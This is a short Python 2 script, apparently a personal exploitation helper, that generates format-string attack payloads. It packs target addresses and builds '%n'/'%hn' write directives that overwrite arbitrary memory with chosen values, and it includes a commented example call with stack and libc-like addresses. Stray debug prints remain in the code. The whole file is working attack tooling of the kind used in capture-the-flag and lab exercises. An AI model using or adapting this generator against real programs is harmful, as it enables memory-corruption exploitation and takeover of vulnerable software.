

import struct

def strexp( data, offset, istack, div=1):
    
    if div not in range(3):
        print('Error : possible values of div : 0,1,2')
        return -1

    n_word = len(data)
    chunk_per_word = 2**div
    chunk_size = 4/chunk_per_word
    n_chunk = n_word*chunk_per_word

    ret = str()
    for i in range(n_chunk):
        ret += struct.pack('I',offset+i*chunk_size)
  
    exploit = ret
   
    format_size = str()
    for i in range(div):
        format_size += 'h'

    carry = n_chunk*4
    iword = n_word-1
    chunks = str()
    for word in data[::-1]:
        for i in range(chunk_per_word)[::-1]:

            mask = (2**(8*chunk_size)-1) << (8*i*chunk_size)
            pad = (word & mask) >> (8*i*chunk_size)
            if carry > pad:
                print hex(pad)
                nbyte = chunk_size*2
                while (pad+(1 << (4*nbyte))-carry) <= 0:
                    nbyte+=chunk_size*2
                
                print nbyte
                pad += 1 << (4*nbyte)
                print hex(pad)
           
            print('carry= '+hex(carry))
            print('pad  = '+hex(pad))
            if carry == pad:
                chunks += '%'+str(iword*chunk_per_word+i+istack)+'$'+format_size+'n'
            else:
                chunks += '%'+str(pad-carry)+'x%'+str(iword*chunk_per_word+i+istack)+'$'+format_size+'n'
                carry = pad
           
            print('aaa')
            print hex(carry)
            carry &= 2**(chunk_size*8)-1
            print hex(carry)
            print('bbb')
        iword-=1
    
    exploit += chunks
   
    return exploit

#print strexp((0x4142,),0,0,1)
#print(strexp((0xb7e54da0,0xdeadbeef,0xb7f75a0b),0xbffff1dc,7,2))
